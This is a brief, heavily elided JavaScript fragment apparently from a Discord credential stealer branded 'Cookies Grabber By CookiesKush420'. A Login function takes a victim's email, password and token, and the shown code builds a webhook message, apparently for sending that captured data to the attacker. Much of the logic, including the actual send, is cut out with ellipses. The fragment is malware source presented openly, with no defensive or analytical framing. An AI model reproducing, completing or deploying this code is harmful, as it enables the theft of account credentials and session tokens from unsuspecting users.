...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            username: "Cookies Grabber",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/947224575622676520/947640493184000040/Pfp.gif",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                    ...
                    "footer": {
                        "text": "Cookies Grabber By CookiesKush420"
                    }
                }
            ]
        }
